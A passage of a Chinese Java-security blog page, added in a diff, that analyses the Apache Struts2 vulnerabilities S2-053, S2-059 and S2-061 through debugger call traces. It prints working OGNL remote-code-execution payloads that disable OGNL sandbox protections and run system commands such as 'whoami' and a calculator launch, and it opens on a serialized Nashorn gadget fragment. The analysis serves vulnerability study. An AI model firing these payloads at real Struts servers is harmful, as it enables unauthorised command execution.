class="hljs-name">dataLen</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">dataLen</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&quot;../jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h2><p>影响版本：Struts 2.0.0 - 2.3.33，Struts 2.5 - Struts 2.5.10.1 </p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-053">https://cwiki.apache.org/confluence/display/WW/S2-053</a></p>
+<p>服务端将用户可控的参数放到了 Freemarker 的标签属性中,在结果解析时，导致RCE</p>
+<p>在解析FreeMarker标签结果时，会调用 FreemarkerResult#doExecute  方法</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414105820120.png" srcset="/img/loading.gif" lazyload alt="image-20250414105820120"></p>
+<p>Template#process 继续调用 freemarker.core.Environment#process </p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414110037624.png" srcset="/img/loading.gif" lazyload alt="image-20250414110037624"></p>
+<p>一路调用 Environment#visit &#x3D;&gt; TemplateElement#accept</p>
+<p>accept 有很多不同的实现</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414110342149.png" srcset="/img/loading.gif" lazyload alt="image-20250414110342149"></p>
+<p>漏洞点就在freemarker.core.UnifiedCall#accept 这个方法 ，执行 visitAndTransform</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414110610432.png" srcset="/img/loading.gif" lazyload alt="image-20250414110610432"></p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414110646630.png" srcset="/img/loading.gif" lazyload alt="image-20250414110646630"></p>
+<p>afterBody() 会去调用 end 方法，这就跟 S2-001 一致了</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414110918614.png" srcset="/img/loading.gif" lazyload alt="image-20250414110918614"></p>
+<h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="hljs-string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@<span class="hljs-keyword">class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="hljs-string">&#x27;whoami&#x27;</span>).(#iswin=(@java.lang.System@getProperty(<span class="hljs-string">&#x27;os.name&#x27;</span>).toLowerCase().contains(<span class="hljs-string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="S2-059"><a href="#S2-059" class="headerlink" title="S2-059"></a>S2-059</h2><p>影响版本：Struts 2.0.0 - Struts 2.5.20 </p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-059">https://cwiki.apache.org/confluence/display/WW/S2-059</a></p>
+<p>这次漏洞是由于标签属性值进行二次表达式解析产生的，同样是在 doStartTag() 和 doEndTag() 解析时触发</p>
+<p>官方给的例子</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">s:url</span> <span class="hljs-attr">var</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/employee&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;list&quot;</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">s:a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;%</span></span></span><span class="hljs-template-variable">&#123;skillName&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;%</span></span></span><span class="hljs-template-variable">&#123;url&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>List available Employees<span class="hljs-tag">&lt;/<span class="hljs-name">s:a</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>如果攻击者能够修改请求中的<code>skillName</code>属性，使得未经进一步验证的原始 OGNL 表达式被传递到<code>skillName</code>属性，那么当请求导致标签被渲染时，<code>skillName</code>属性中包含的 OGNL 表达式将被求值。</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414183841950.png" srcset="/img/loading.gif" lazyload alt="image-20250414183841950"></p>
+<p>确实是执行了</p>
+<p>org.apache.struts2.views.jsp.ComponentTagSupport#doStartTag </p>
+<p>执行 populateParams</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414184327167.png" srcset="/img/loading.gif" lazyload alt="image-20250414184327167"></p>
+<p>会去调用父类的 populateParams</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414184404074.png" srcset="/img/loading.gif" lazyload alt="image-20250414184404074"></p>
+<p>一直跟如会来到 OgnlTextParser#evaluate 获取到我们传入的表达式</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414185459815.png" srcset="/img/loading.gif" lazyload alt="image-20250414185459815"></p>
+<p>第二次循环执行我们传入的ognl表达式</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414185638662.png" srcset="/img/loading.gif" lazyload alt="image-20250414185638662"></p>
+<h2 id="S2-061"><a href="#S2-061" class="headerlink" title="S2-061"></a>S2-061</h2><p>影响版本：Struts 2.0.0 - Struts 2.5.25 </p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-061">https://cwiki.apache.org/confluence/display/WW/S2-061</a></p>
+<p>是对 S2-59的绕过</p>
+<h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs clean">%&#123;<br>(#im=#application[<span class="hljs-string">&quot;org.apache.tomcat.InstanceManager&quot;</span>]).<br>(#stack=#attr[<span class="hljs-string">&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;</span>]).<br>(#bm=#im.newInstance(<span class="hljs-string">&quot;org.apache.commons.collections.BeanMap&quot;</span>)).<br>(#bm.setBean(#stack)).<br>(#context=#bm.get(<span class="hljs-string">&quot;context&quot;</span>)).<br>(#bm.setBean(#context)).<br>(#ma=#bm.get(<span class="hljs-string">&quot;memberAccess&quot;</span>)).<br>(#bm.setBean(#ma)).<br>(#emptyset=#im.newInstance(<span class="hljs-string">&quot;java.util.HashSet&quot;</span>)).<br>(#bm.put(<span class="hljs-string">&quot;excludedClasses&quot;</span>,#emptyset)).<br>(#bm.put(<span class="hljs-string">&quot;excludedPackageNames&quot;</span>,#emptyset)).<br>(#arglist=#im.newInstance(<span class="hljs-string">&quot;java.util.ArrayList&quot;</span>)).<br>(#arglist.add(<span class="hljs-string">&quot;open -a Calculator.app&quot;</span>).<br>(#execute=#im.newInstance(<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>)).<br>(#execute.exec(#arglist))<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.javasec.org/java-vuls/Struts/Struts2-2.html">https://www.javasec.org/java-vuls/Struts/Struts2-2.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.topsec.com.cn/struts2-s2-059-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://blog.topsec.com.cn/struts2-s2-059-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/java%E5%AE%89%E5%85%A8/" class="category-chain-item">java安全</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/java%E5%AE%89%E5%85%A8/Struts2/" class="category-chain-item">Struts2</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java%E5%AE%89%E5%85%A8/" class="print-no-link">#java安全</a>
+      
+        <a href="/tags/Struts2/" class="print-no-link">#Struts2</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>struts2反序列化12-61</div>
+      <div>http://lingx5.github.io/2025/04/10/struts2反序列化12-61/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>lingx5</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年4月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/04/10/struts2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961-9/" title="struts2漏洞1-9">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">struts2漏洞1-9</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/04/06/java-CC4-%E9%93%BE%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/" title="java-CC4 链审计笔记">
+                        <span class="hidden-mobile">java-CC4 链审计笔记</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
